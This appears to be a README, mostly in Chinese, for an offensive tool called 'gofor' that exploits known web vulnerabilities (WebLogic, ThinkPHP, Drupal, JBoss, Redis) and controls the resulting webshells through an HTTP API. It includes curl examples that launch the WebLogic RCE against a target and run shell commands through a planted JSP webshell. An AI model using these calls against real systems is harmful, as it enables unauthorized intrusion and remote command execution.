# gofor
一款集漏洞探测、攻击，Session会话，蜜罐识别等功能于一身的软件，基于go-micro微服务框架并对外提供统一HTTP API网关接口服务

## HTTP API Gateway
```shell
./api-srv
```

## Service Install(Optional)
**Exploit**
```
./srv-exploit
```
**Webshell**
```webshell
./srv-webshell
```

# Example
[*] CVE-2017-10271 Weblogic RCE 攻击例子
```shell
curl -H "Content-Type:application/json;charset=utf-8" -X POST -d '{"target":"http://x.x.x.x:7001","cve":"CVE-2017-10271"}' http://127.0.0.1:8888/exploit/ExploitServiceExt/ExploitWithAttack
```
`{"cve":"CVE-2017-10271","tunnel":"192.168.27.129:38533/wls-wsat/ant.jsp"}`

[*] php webshell调用例子
```shell
curl -H "Content-Type:application/json;charset=utf-8" -X POST -d '{"target":"http://192.168.27.129:38533/wls-wsat/ant.jsp","language":"jsp","cmd":"pwd"}' http://127.0.0.1:8888/webshell/WebshellServiceExt/RunCmdWithOutput
```
`{"output":"/root/Oracle/Middleware/user_projects/domains/base_domain"}`


# 当前支持漏洞列表
| id | 漏洞名 |
|--|--|
| VUL-2021-04271  | Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability |
| VUL-2021-04272  | ThinkPHP5 5.0.23 Remote Code Execution Vulnerability |
| CVE-2017-10271  | Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞 |
| VUL-2021-05081  | Redis Unauthorized Vulnerability 漏洞 |
| CVE-2018-7600   | Drupal Drupalgeddon 2 Remote Code Execution Vulnerability |
| CVE-2017-12149  | JBoss 5.x/6.x 反序列化漏洞 |
